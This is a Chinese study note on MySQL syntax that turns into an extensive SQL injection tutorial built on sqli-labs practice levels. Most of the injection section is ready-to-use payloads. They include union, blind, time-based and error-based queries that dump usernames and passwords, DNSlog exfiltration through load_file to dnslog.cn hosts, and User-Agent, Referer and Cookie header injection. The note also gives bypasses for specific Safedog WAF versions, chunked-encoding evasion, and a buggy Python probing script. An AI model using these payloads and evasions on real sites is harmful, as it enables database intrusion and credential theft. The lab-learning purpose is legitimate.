# SQL通用语法

1. SQL语句可以单行或多行书写，以分号结尾
2. MySQL数据库的SQL语句不区分大小写，关键字建议使用大写
3. 注释
   * 单行注释：-- 注释内容（注意空格） 或 #注释内容（MySQL独有）
   * 多行注释：/* 注释 */

# SQL分类

## DDL(定义)

DDL(Data Definition Language)数据**定义**语言，用来定义数据库对象：数据库，表，列等

1. 对数据库进行操作

* **create database** 数据库名称; **创建数据库**
* **drop database (if not exists)** 数据库名称; **删除数据库(判断是否存在)**
* **show database**; **查询**
* **use** 数据库名称; **使用数据库**
* **select database()**; **查看当前使用的数据库**

2. 对表进行操作

* **show tables**; **查询当前数据库下所有表的名称**

* **desc** 表名称; **查询表结构**

* **create table** 表名称(

  字段名1 数据类型1,

  字段名2 数据类型2,

  …

  字段名n 数据类型n (注意这里没有逗号！！！)

  ); **创建表**

* **drop table** **(if exists)**表名称; **删除表(删除时判断表是否存在)**

* **alter table** 表名称 **rename to** 新的表名; **修改表名**

* **alter table** 表名称 **add** 表名; **添加一列**

* **alter table** 表名称 **modify** 列名 新数据类型; **修改数据类型**

* **alter table** 表名称 **change** 列名 新列名 新数据类型; **修改列名和数据类型**

* **alter table** 表名称 **drop** 列名; **删除列**

|      分类      |                           数据类型                           |                             大小                             |                             描述                             |
| :------------: | :----------------------------------------------------------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
|    数值类型    | TINYINT<br />SMALLINT<br />MEDIUMINT<br />INT或INTEGER<br />BIGINT<br />FLOAT<br />DOUBLE<br />DECLMAL | 1 byte<br />2 bytes<br />3 bytes<br />4 bytes<br />8 bytes<br />4 bytes<br />8 bytes | 小整数值<br />大整数值<br />大整数值<br />大整数值<br />极大整数值<br />单精度浮点数值<br />双精度浮点数值<br />小数值 |
| 日期和时间类型 |    DATA<br />TIME<br />YEAR<br />DATETIME<br />TIMESTAMP     |                3<br />3<br />1<br />8<br />4                 | 日期值<br />时间值或持续时间<br />年份值<br />混合日期和时间值、时间戳 |
|   字符串类型   | CHAR<br />VARCHAR<br />TINYBLOB<br />TINYTEXT<br />BLOB<br />TEXT<br />MEDIUMBLOB<br />MEDIUMTEXT<br />LONGBLOB<br />LONGTEXT | 0-255 bytes<br />0-65535 bytes<br />0-255 bytes<br />0-255 bytes<br />0-65535 bytes<br />0-65535 bytes<br />0-16777215 bytes<br />0-16777215 bytes<br />0-4294967295 bytes<br />0-4294967295 bytes | 定长字符串<br />变长字符串<br />不超过255个字符串的二进制字符串<br />短文本字符串<br />二进制形式的长文本数据<br />长文本数据<br />二进制形式的中等长度文本数据<br />中等长度文本数据<br />二进制形式的极大文本数据<br />极大文本数据 |



## DML(操作)

DML(Data Manipulation Language)数据**操作**语言，用来对数据库中表的数据进行增删改

### 添加

* **insert into** 表名称(列名，列名2，…) **values**(值1，值2，…); **给指定列添加数据**
* **insert into** 表名称 **values**(值1，值2，…); **给全部列添加数据**
* **insert into** 表名称(列名，列名2，…) **values**(值1，值2，…),(值1，值2，…),(值1，值2，…)…; **批量添加数据**
* **insert into** 表名称 **values**(值1，值2，…),(值1，值2，…),(值1，值2，…)… **批量添加数据**

### 修改

* **update** 表名称 **set** 列名1=值1，列名2=值2，… **where** 条件;[^如果update语句没有加条件，则所有数据将被修改]

### 删除

* **delete from** 表名称 **where** 条件;[^删除语句中不加条件，则将所有的数据删除]

## DQL(查询)

DQL(Data Query Language)数据**查询**语言，用来查询数据库中表的记录(数据)

### 基础查询

* **select** 字段列表 **from** 表名称; **查询多个字段**
* **select** * **from** 表名称; **查询所有数据**
* **select** **distinct** 字段列表 **from** 表名称; **去除重复记录**
* **select** 字段列表 **as** 别名 表名称; **起别名(as可以省略)**

### 条件查询

* select 字段列表 from 表名称 where 条件列表;

|    符号     |                 功能                 |
| :---------: | :----------------------------------: |
|      >      |                 大于                 |
|      <      |                 小于                 |
|     >=      |               大于等于               |
|     <=      |               小于等于               |
|      =      |                 等于                 |
|   !=或<>    |                不等于                |
| between…and |        在某个范围之内(都包含)        |
|    in(…)    |                多选一                |
| like 占位符 | 模糊查询 _单个任意字符 %多个任意字符 |
|   is null   |                是null                |
| is not null |               不是null               |
|  and 或 &&  |                 并且                 |
| or 或 \|\|  |                 或者                 |
|  not 或 !   |               非，不是               |

### 排序查询(order by)

* **select** 字段列表 **from** 表名称 **order by** 排序字段名1 [排序方式],排序字段名2[排序方式] …;[^ 如果有多个排序条件，当前边的条件值一样时，才会根据第二条件进行排序]

  **排序方式**

  * ASC:升序排序(默认值)
  * DESC:降序排序

### 聚合函数

1. 概念:

   将一列数据作为一个整体，进行纵向计算

2. 聚合函数分类:

   |   函数名    |              功能              |
   | :---------: | :----------------------------: |
   | count(列名) | 统计数量(一般选用不为null的列) |
   |  max(列名)  |             最大值             |
   |  min(列名)  |             最小值             |
   |  sum(列名)  |              求和              |
   |  avg(列名)  |             平均值             |

3. 聚合函数语法

   **select** 聚合函数名(列名) **from** 表名称;[^null值不参与所有聚合函数运算]

### 分组查询(group by)

分组查询语法

**select** 字段列表 **from** 表名称 [**where** 分组前条件限定] **group by** 分组字段名 [**having** 分组后条件过滤];[^分组之后，查询的字段为聚合函数和分组字段，查询其他字段无任何意义]

where和having区别:

* 执行时机不一样：where是分组之前进行限定，不满足where条件，则不参与分组，而having是分组之后对结果进行过滤。
* 可判断的条件不一样：where不能对聚合函数进行判断，having可以。

执行顺序：where > 聚合函数 > having

### 分页查询

**select** 字段列表 **from** 表名称 **limit** 起始索引，查询条目数;

* 起始索引从0开始

tips:

* 分页查询limit是MySQL数据库的方言(只能在MySQL使用)
* Oracle分页查询使用rownumber
* SQL Server分页查询使用top

## DCL(控制)

DCL(Data Control Language)数据**控制**语言，用来定义数据库的访问权限和安全级别，及创建用户

# 约束

1. 约束的概念

   * 约束是作用于表中列上的规则，用于限制加入表的数据
   * 约束的存在保证了数据库中数据的正确性、有效性和完整性

2. 约束的分类

   | 约束名称 | 描述                                                         | 关键字      |
   | -------- | ------------------------------------------------------------ | ----------- |
   | 非空约束 | 保证列中的数据不能有NULL值                                   | NOT NULL    |
   | 唯一约束 | 保证列中的数据各不相同                                       | UNIQUE      |
   | 主键约束 | 主键是一行数据的唯一标识，要求非空且唯一                     | PRIMARY KEY |
   | 检查约束 | 保证列中的值满足某一条件                                     | CHECK       |
   | 默认约束 | 保存数据时，未指定值则采用默认值                             | DEFAULT     |
   | 外键约束 | 外键用来让两个表之间的数据之间建立链接，保证数据的一致性和完整性 | FOREIGN KEY |

   **Tips：MySQL不支持检查约束**

   ```mysql
   CREATE TABLE emp(
       id INT PRIMARY KEY AUTO_INCREMENT , -- 员工id，主键且自增长
   	ename VARCHAR(50) NOT NULL UNIQUE , -- 员工姓名，非空且唯一
   	joindate DATE NOT NULL , -- 入职日期，非空
   	salary DOUBLE(7, 2) NOT NULL , -- 工资，非空
   	bonus DOUBLE(7, 2) DEFAULT 0 -- 奖金，如果没有奖金默认为0
   );
   ```

   ```mysql
   -- 创建表时添加约束
   CREATE TABLE 表名(
   	列名 数据类型 NOT NULL,
   	...
   );
   -- 建完表之后添加约束
   ALTER TABLE 表名 MODIFY 字段名 数据类型 NOT NULL;
   -- 删除约束
   ALTER TABLE 表名 MODIFY 字段名 数据类型;
   ```

   ```mysql
   -- 外键约束
   CREATE TABLE 表名(
       列名 数据类型,
       ...
       [CONSTRAINT] [外键名称] FOREIGN KEY(外键列名) REFERENCES 主表(主表列名)
   );
   ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段名称) REFERENCES 主表名称(主表列名称);
   -- 删除约束
   ALTER TABLE 表名 FOREIGN KEY 外键名称;
   ```

# 数据库设计



# SQL注入

## 系统库释义:

**information_scheme**库:是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库信息，比如数据库名，数据库表，表字段的数据类型与访问权限等，Web渗透过程中用途很大。

**schemata**表:提供了当前MySQL实例中所有数据库信息，show databases结果取之此表。

**tables**表:提供了关于数据中表的信息。

**columns**表:提供了表中的列信息，详细描述了某张表的所有列以及每个列的信息。

**mysql**库:MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。

**performance_scheme**库:内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级，将数据保存在内存中相比从磁盘上访问能够极大地提高应用的性能。

**sys**库:通过这个数据库，可以查询谁使用了最多的资源，基于IP或是用户。哪张表被访问过最多等等信息。

## What is SQL Injection

### SQL注入漏洞是什么

是发生于应用程序与数据库层的安全漏洞。 网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的 输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。

### GET型SQL注入漏洞是什么

我们在提交网页内容时候，主要分为GET方法，POST方法，GET方法提交的内容会显现 在网页URL上，通过对URL连接进行构造，可以获得超出权限的信息内容。

**Web程序三层架构：界面层 + 业务逻辑层 + 数据访问层**

**原理：**

```mysql
SELECT * FROM t1 WHERE id = %s;
sqlStr := SELECT * FROM t1 WHERE name = ‘%s’ username;
当用户输入1 or 1 = 1
实际上执行的sql
SELECT * FROM t1 WHERE id = 1 OR 1 = 1；
也就是
SELECT * FROM t1;
```

![image-20231209104841909](SQL%E6%B3%A8%E5%85%A5.assets/image-20231209104841909.png)

**SQL注入带来的威胁**

* 猜解后台数据库，盗取网站敏感信息
* 绕过验证登录网站的后台
* 借助数据库的存储过程进行提权等操作

![image-20231209105105479](SQL%E6%B3%A8%E5%85%A5.assets/image-20231209105105479.png)

## SQL Injection Type

### union联合查询注入

Gifts union select 1,2,3,4#

在使用union select database()之前，要先确定有多少列，使用group by(order by)来判断

### Boolean-Base布尔型注入

布尔盲注的前提是页面有真假值

```mysql
通过ascii()函数,length()函数来进行大小比较从而确定字母
http://192.168.88.133/sql/Less-7?id=1')) and length((select database()))>7--+
http://192.168.88.133/sql/Less-7?id=1')) and length((select database()))>8--+
第一个命令回显是true，而第二个回显false，证明数据库名字长度为8
http://192.168.88.133/sql/Less-7?id=1')) and ascii(substr((select database()),1,1))>100--+
与substr()函数配合使用，即可将字母一个一个确认
```

### Time-Based基于时间延迟注入

通过注入特定语句，根据页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数来看加载页面的时间来判断注入点

**适用场景：没有回显，甚至连注入语句是否执行都无从得知**

**原理分析**
有如下语句
select * from products where category = '?';
如果用户输入
Gifts' and sleep(2)#
那么原始语句就是
select * from products where category = 'Gifts' and sleep(2)
当category='Gifts'有值的话，休眠2秒
当category='Gifts'没有值的话，直接返回

**substr()函数**==变种mid()函数，用法一样==
分割字符串
select substr('Micheal',1,1)[^从第一个字符串开始取，取一个]
select substr('Micheal',2)[^从第二个开始取，取到最后]
select substr(database(),1,1) = 's'[^取数据库名的第一个字母，并判断是否为s，如果为s，则会返回1，否则返回0]

**length()函数**
见名知意，获取长度
select length(database())[^获取数据库名长度]

select substr(database(),1,1)='a' and sleep(2)[^从a一直试，直到发现页面返回慢了，则是正确的]

**ascii()函数**==变种ord()函数，用法一样==
select ascii('Micheal')[^获取字符串的ASCII码，此语句只能获得M的ASCII码]

select ascii(substr(database(),2,1))=33 and sleep(2)[^联合使用，通过ASCII码来试]

**count()函数**
select count(database())[^计算数据库名有多少字符]

**left()函数,right()函数**

select left('Micheal',3)[^结果是Mic]
select right('Micheal',3)[^结果是eal]

**if()函数**

if(condition,true,false)如果condition为真，那么执行true，反之执行false

```mysql
http://192.168.88.133/sql/Less-9?id=1' and if(ascii(substr((select database()),1,1))>100,sleep(0),sleep(3)) --+
以上便是利用时间盲注得到数据库名的方法
```

sleep可以使用benchmark函数来替换，benchmark(1000000,md5(‘A’))指执行1000000次查询，即可达到延时的效果

### Error-Based报错型注入

#### extractvalue报错注入

```mysql
http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+ 
concat函数是让0x7e和后面的指令连接在一起，0x7e是~的ASCII码，会使MySQL报错，从而爆出后面执行语句的结果。extractvalue的两个参数的第一个可以随便写，如上面写的是1
```

报错注入的局限性在于最多显示32个字符，可以配合使用substring()函数

```mysql
http://127.0.0.1/sql/Less-5?id=0' union select 1,extractvalue(1,concat(0x7e,(select substring(group_concat(username,'~',password),25,30) from users))),3--+ 
substring使其从第25个字符开始往后再显示30个字符，再拼接起来就得到了所有用户名和密码
```



#### updataxml报错注入

```mysql
updatexml函数有三个参数
updatexml(XML_document[XML文档对象的名称],XPath_string[路径],new_value[替换查找到的符合条件的数据])
报错原理同extractvalue()，输入错误的第二个参数，即更改路径的符号，第一个参数和第三个参数可以随便填
http://127.0.0.1/sql/Less-5?id=0' union select 1,updatexml(1,concat(0x7e,(select database())),3),3--+ 
```

#### floor报错注入

涉及函数：

rand()函数：随机返回0~1之间的小数

floor()函数：小数向下取整数

ceiling()函数：小数向上取整数

concat_ws()函数：将括号内数据用第一个字段连接起来

```mysql
select concat_ws('~',2,3);
执行结果是2~3
```

count()函数：汇总统计数量

```mysql
select concat_ws('~',(select database()),floor(rand()*2)) from users;
有多少用户就计算多少次，且结果随机
```

```mysql
select count(*),concat_ws('~',(select database()),floor(rand()*2)) as a from users group by a;
as别名，group by分组，count()汇总统计数量
rand()偶尔会出现报错，rand(0)固定报错，rand(1)不报错，原因：
当我们将count(*)去掉便不再报错，说明是在统计时出现错误
rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复(不是很懂)
```

```sql
http://127.0.0.1/sql/Less-5/?id=1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as x from information_schema.tables group by x--+
完整注入，爆表
```

### DNSlog注入

该注入方式同为盲注，但是其效率比布尔盲注和时间盲注的效率要高，**但使用该方法的前提是能够对目标进行文件访问的操作**

相关网址：

http://www.dnslog.cn/

http://admin.dnslog.link 

http://ceye.io

```mysql
http://192.168.88.133/sql/Less-9?id=1' and (select load_file(concat("//",(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.x49qnf.dnslog.cn/123')))--+
爆表名(修改limit后面的参数来控制输出第几个表名，如0,1爆出emails表，1,1爆出referers表，limit第二个参数是控制输出几行)
http://192.168.88.133/sql/Less-9?id=1' and (select load_file(concat("//",(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),'.x49qnf.dnslog.cn/123')))--+
爆列名
http://192.168.88.133/sql/Less-9?id=1' and (select load_file(concat("//",(select password from users limit 1,1),'.33g24w.dnslog.cn/123')))--+
http://192.168.88.133/sql/Less-9?id=1' and (select load_file(concat("//",(select username from users limit 1,1),'.33g24w.dnslog.cn/123')))--+
爆用户名和密码
```

### POST报头注入(HTTP头uagent注入)

当页面看不到明显变化，找不到注入点时，可以尝试报头注入(以Less-18为例，在对源代码的审计中发现check_input函数对输入的用户名和密码进行了检测，导致无法进行注入)

uagent，即User-Agent，中文名为用户代理，简称UA，它是一个特殊字符串头，使得服务器能够识别客户端使用的操作系统及版本、CPU类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。内容就是浏览器及版本信息，电脑信息等。常见用途为限制打开软件，浏览器，以及上网行为管理等。

```php
 $insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
在sqli-labs靶场的Less-18的源代码中有这么一串代码，登录成功后，会把'$uagent','$IP','$uname'的信息插入数据表'uagents'
首先要求登录成功，然后可以修改$uagent参数（没有做check_input检查），做报错注入（只能做报错注入），在插入信息时执行指令导致出错，反馈错误信息，登录后输出uagent信息包括报错信息，达到注入效果。
```

在输入账号和密码之后，用burpsuite抓包，修改User-Agent这行

![image-20240306203617734](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306203617734.png)

![image-20240306203730284](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306203730284.png)

查看源代码得知$uagent是被单引号所包裹起来的，所以首先要加一个单引号闭合，再加#将后面注释，还需注意有一个单括号

```mysql
User-Agent: 'or updatexml(1,concat('~',(select database())),3),2,3) #
```

![image-20240306205316847](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306205316847.png)

这是在源代码中的效果

![](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306204058842.png)

![image-20240306204206732](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240306204206732.png)

![image-20240306204449031](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306204449031.png)

之后再直接在burpsuite中修改就可得到表名，列名及信息

### HTTP头referer注入

Referer，即HTTP Referer，是头部信息header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个网页链接过来的，服务器因此可以获得一些信息用于处理。

以Less-19为例，在对源代码的审计中发现check_input函数对输入的用户名和密码进行了检测，导致无法进行注入，但是发现

```php
$insert = "INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
登录成功后，会把'$referer','$IP'的信息插入数据表'referers'
首先要求登录成功，然后可以修改$referer参数（没有做check_input检查），做报错注入（只能做报错注入），在插入信息时执行指令导致出错，反馈错误信息，登录后输出referer信息包括报错信息，达到注入效果。
```

![image-20240306210743599](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306210743599.png)

```mysql
INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (1 or extractvalue(1,concat('~',(SELECT DATABASE()))),2);
```

![image-20240306211047706](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306211047706.png)

```mysql
在burpsuite中输入
Referer: ' or extractvalue(1,concat('~',(select database()))),2)#
```

![image-20240306211532796](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306211532796.png)

### HTTP头Cookie注入

Less-20为例

不同于Uagent和Referer的源代码

```php
$result1=mysql_query($sql);
$row1=mysql_fetch_array($result1);
$cookee=$row1['username'];
setcookie('uname',$cookee,time()+3600);
```

```php
函数setcookie(name,value,expire,path,domain,secure)
    参数name 必需 规定cookie的名称
    参数value 必需 规定cookie的值
    参数expire 可选 规定cookie的有效期
    参数path 可选 规定cookie的服务器路径
    参数domain 可选 规定cookie的域名
    参数secure 可选 规定是否通过安全的HTTPS连接来传输cookie
```

```php
生成cookie后
    $cookee=$_COOKIE['uname'];
	echo"YOUR COOKIE:uname=$cookee and expires:".data($format,$timestamp);
在有效期内再次刷新页面，客户端向数据库服务器发送cookie进行验证，不需要再次输入用户名和密码，且提交值$cookee不再进行check_input验证。
```

```php
$sql = "SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
```

由于是使用单引号闭合，且前面使用了select，可以使用union注入

![image-20240306214109056](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306214109056.png)

![image-20240306214544099](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306214544099.png)

### 异或注入

```mysql
id=1^(length(database())<4)^1#
像这种语句，如果中间语句结果为true，那么为1，id=1，如果中间语句结果为false，那么为0，id=0，从而判断出所需要的信息
```



## 注释符号过滤绕过

在Less-23中，注释符全部被过滤无法使用，查看源代码，发现

```php
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
就是当出现#和--时，就会删掉，从而无法使用注释符
```

可以尝试将单引号闭合从而执行指令，比如

```mysql
http://192.168.88.133/sql/Less-23?id=0' union select 1,database(),3 and '1'='1
```

![image-20240306221638302](SQL%E6%B3%A8%E5%85%A5.assets/image-20240306221638302.png)

然后就直接union注入秒了，其他的闭合方式仿照即可

## and和or过滤绕过

```php
function blacklist($id){
    $id = preg_replace('/or/i',"",$id);
    $id = preg_replace('/AND/i',"",$id);
    return $id;
}
这是过滤的源代码，即把and和or删除
```

绕过手法：

1. 使用大小写绕过，例如

   ```mysql
   ?id=1' anD 1=1--+
   ```

2. 复写过滤字符，例如

   ```mysql
   ?id=1' anandd 1=1--+
   ```

3. 用&&取代and，用||取代or，例如

   ```mysql
   ?id=1' && 1=1--+
   如果无法执行那么尝试换成url编码%26(&)
   ```

## 空格过滤绕过

以Less-26为例，查看源代码发现

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
把or,and,/*,--,#,spaces,slashes都过滤掉了
```

```php
1.用+替代空格
2.使用URL编码替代空格
    spaces-------%20
    TAB 09 horizontal TAB-------%09
    LF OA newline-----------%0A
    FF OC new page-----------%0C
    CR 0D carriage return------%0D
    VT 0B vertical TAB----------%0B
    -OA-(MySQL only)---------%A0
    一个一个尝试，没有可以成功绕过的
3.使用报错注入
    ?id=0'||extractvalue(1,concat('~',(database())))||'1'='1
    成功
    之后可以将database()替换为:
select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())
select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())aandnd(table_name='users')
select(group_concat(username,'~',passwoorrd))from(users)
注意information由于or被过滤所以要双写，多用括号来替换掉空格，同时注意or和and的复写
4.使用块注释符/**/
```

**环境不一样可能导致方法不一样**

## 逗号过滤绕过

```mysql
需求：查询users表用户的email都是多少
select u.*,e.*
from users u,emails e
where u.id=e.id;
或使用join
select u.*,e.*
from users u JOIN emails e on e.id=u.id
```

```mysql
union select 1,2,3
等价于
union select * from (select 1)a join (select 2)b join (select 3)c;
```

```mysql
union select * from (select 1)a join (select 2)b join (select group_concat(table_name) from information_schema.tables where table_schema=database())c;
```

## union及select过滤绕过

1. 尝试大小写绕过

2. 尝试复写单词绕过

3. 尝试报错注入

   ```mysql
   ?id=0'||extractvalue(1,concat('~',(database())))||'1'='1
   ```

## 宽字节注入

函数addslashes()在指定的预定义字符前添加反斜杠。这些字符是单引号、双引号、反斜线与NULL

当输入1’时，addslashes()函数会将’转义，从而无法注入

**使用宽字节注入的前提是要求对方MySQL数据库的编码方式是GBK编码，并且发送请求时声明客户端用的也是GBK编码**

MySQL在使用GBK编码时，会认为两个字符为一个汉字，所以可以使用一些字符，和经过转义过后多出来的 \ 组合成两个字符，变成MySQL数据库不识别的汉字字符，导致对单引号、双引号的转义失败，使其参数闭合。

输入 %df’ ，本来会转义单引号 ’ 为 \' ，但 \ 的编码是%5c，编码位为92，%df的编码位为223，%df%5c符合GBK取值范围（第一个字节129-254，第二个字节64-254），会解析为一个汉字，这样 \ 就会失去应有的作用

## waf绕过

常用方法：

1. 注释

   ```mysql
   /**/：在MySQL里，多行注释是/**/，这是SQL的标准
   /*!*/：但是MySQL扩张了注释的功能，假如在开头的/*后面加了感叹号，那么注释里的语句将被执行
   /*!50001xxx*/：这里的50001表示假如数据库是5.00.01以上的版本，该语句才会被执行
   ```

   

2. 空白符

3. 特殊符号

4. 编码

5. 替换

   ```mysql
   1.and和or替换
   	一、&&和||
   	二、使用异或截断
   		?id=1^1^0
   		?id=1^0^0
   	三、使用[``operation]
   		and{`test` 1=2}
   		and{`test` 1=1}
   	四、直接使用真假
   		&& true
   		&& false
   2.order by替换
   	group by
   3.union select
   	union select放在一起被过滤的情况下，试着在union和select中间插入一些字符比如/*!90000benben*/，注释符里的指令会被执行，但是由于版本号小于90000，所以不会被执行，从而绕过waf的同时不会干扰其它指令的执行
   	union all select
   4.information_shcema.tables
   	sys.schema_table_statistics_with_buffer
   	sys.x$ps_schema_table_statistics_io
   5.information_schema.columns
   	join法获取列名(前提是有报错回显，盲注不可用)
   		第一列列名：union /*!90000a*/ select * from (select * /*!90000a*/from /*!90000a*/users as a join users as b)as c——会将第一个列名通过报错的形式显示出来
   		第二列列名：union /*!90000a*/ select * from (select * /*!90000a*/from /*!90000a*/users as a join users as b using(id))as c——在第一个列名被暴露之后，使用using(id)过滤掉一个个列名，从而显示第二个列名
   		第三列列名：union /*!90000a*/ select * from (select * /*!90000a*/from /*!90000a*/users as a join users as b using(id,username))as c——暴露两个列名后，用using(id,username)过滤第一第二个列名，得到第三个列名
   ```
   

### 安全狗4.0.26550绕过

以使用了waf(**安全狗4.0.26550**)的Less-1为例，在进行waf的绕过时，务必随时提交，以得知waf是将哪些语句过滤

```mysql
首先，使用2-1进行字符型还是数字型的判断
输入?id=2-1结果与?id=1回显不一样，说明是字符型的，否则为数字型
单输入一个单引号，报错，得知闭合方式
使用order by，发现被防火墙拦截，改为group by成功绕过
尝试使用union select 1,2,3，发现被防火墙拦截，单独写union，没有被拦截，在后面加一个字符，也没有被拦截，换成select，则被拦截，得知union 和select放在一起时会被拦截，在union和select之间插入/*!90000a*/，成功绕过
输入?id=0' union /*!90000a*/ select 1,2,database()--+，被防火墙拦截，基本可以确定是database()的问题，那么在括号内填入/*!90000a*/，成功绕过
输入?id=0' union /*!90000a*/ select 1,2,database(/*!90000a*/) --+，再一步步添加字符，先写group_concat()提交，没有被拦截，加上table_name，没被拦截，加上from，没被拦截，再加上information_schema.tables，发现被拦截，那么换成一个别的字符，比如in，同样被拦截，将前面的结构破坏来测试是哪里被拦截，发现可能是select和from同时出现后后面不能加字符，直接在from前面加一个/*!90000a*/发现成功绕过：?id=0' union /*!90000123*/ select 1,2,group_concat(table_name) /*!90000123*/ from information_schema.tables--+
输入?id=0' union /*!90000a*/ select 1,2,group_concat(table_name) /*!90000a*/ from information_schema.tables--+，接着一步步添加命令，加上where，没被拦截，再加上table_schema，没被拦截，再加上database(/*!90000a*/)，成功绕过，得到表名
```

### 安全狗3.5.12048绕过

```mysql
同样union select被拦截，除了采用/*!90000a*/的方式，还可以采用在union select间插入--+b%0A的方式绕过，b是任意字符都可以，因为%0A为换行符，打出来的效果是
?id=0' union --+b
select 1,2,3--+
将b注释掉了，但是并没有将select注释，让waf误以为中间插入了一个b，从而实现绕过
然后同样，发现group_concat(table_name)同样没被拦截，from加了字符后被拦截，在from前加--+b%0A，成功绕过
再加information_schema，被拦截，破坏from结构，仍然被拦截，说明不是from的问题，破坏information_schema的结构，没被拦截，说明不能出现information_schema，将information_schema改为sys.schema_table_statistics_with_buffer，成功绕过，再加入table_schema=database(/*!90000a*/)即可得到表名
由于information_schema被拦截，使用join方法来获得列名
第一列列名：union /*!90000a*/ select * from (select * /*!90000a*/from /*!90000a*/users as a join users as b)as c——会将第一个列名通过报错的形式显示出来
第二列列名：union /*!90000a*/ select * from (select * /*!90000a*/from /*!90000a*/users as a join users as b using(id))as c——在第一个列名被暴露之后，使用using(id)过滤掉一个个列名，从而显示第二个列名
第三列列名：union /*!90000a*/ select * from (select * /*!90000a*/from /*!90000a*/users as a join users as b using(id,username))as c——暴露两个列名后，用using(id,username)过滤第一第二个列名，得到第三个列名
最后使用?id=0' union --b%0A select 1,2,group_concat(username,password) --+b%0A from users--+得到信息
```

### 安全狗3.5超大数据包绕过(POST)

通过提交很多内容，利用waf可能只会检查前面一部分，来绕过检查

```python
import requests

url = 'http://192.168.88.133/sql/Less-1' # 要注入的网址

data = "id = 0' /**/ union select 1,2,3 --+" # /**/中间填充的是字符，用来检测需要多少字符才能绕过

headers = {
    'Host': 192.168.88.133
	'User-Agent': Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
	'Accept':text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
	'Accept-Language': zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
	'Accept-Encoding': gzip, deflate
	'Referer': http://192.168.88.133/sql/
	'Connection': close
	'Upgrade-Insecure-Requests': 1
}

for i in range(1,1000):
    m = '/*' + str('benben') * i + '*/'
    data = "id = 0' /**/ union select 1,2,database() --+"
    res = request.post(url, headers=headers, data=data).text
    if 'qt-block-indent:0; text-indent' not in res: # 这句话只有在触发安全狗的拦截时会出现，出现了证明就被拦截了
        print('[+] current userful payload length', i) # 直到长度可以绕过，就不会出现qt-block-indent:0; text-indent
    else:
        print('{} not userful'.format(i))
```

### sql注入分块传输绕过waf

在使用burpsuite抓包之后，在最后加上

```mysql
Transfer-Encoding:Chunked
```

然后根据分开的字符数写上数量，在最后加一个0，在换行两次，比如

```mysql
3    # 下一行有三个字符
id=
1    # 下一行有一个字符
1
0    # 一个0
     # 两个换行

```

可以使用github上的一个全自动分块的扩展来进行操作(burpsuite)

https://github.com/c0ny1/chunked-coding-converter

![image-20240308192726538](SQL%E6%B3%A8%E5%85%A5.assets/image-20240308192726538.png)

这样就可以绕过waf

![image-20240308192814585](SQL%E6%B3%A8%E5%85%A5.assets/image-20240308192814585.png)

## 如何判断是字符型注入还是数字型注入

使用and 1=1和and 1=2来判断

如果是字符型，就算是and 1=2，页面依旧正常显示，而数字型的话页面不会正常显示

在Less-1中提交and 1=1和提交and 1=2都能正常显示页面，则为字符型注入

在Less=2中提交and 1=2时，网页无法正常显示，判断为数字型注入

**还有一种方法就是?id=2-1，如果是数字型，那么显示的页面就是?id=1，如果是字符型，显示的页面就是?id=2**[^个人感觉比较好用]

```sql
字符型：
$sql="SELECT * FROM USERS WHERE id='$id' LIMIT 0,1";
提交 1 and 1=1:
$sql="SELECT * FROM users WHERE id='1 and 1=1' LIMIT 0,1";
单引号闭合语句后Where语句为一个条件id=' 1 and 1=1'
数字型：
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
提交 and 1=2
$sql="SELECT * FROM users WHERE id=$id and 1=2 LIMIT 0,1";
数字型不需要闭合
```

## 二次注入

1、概述

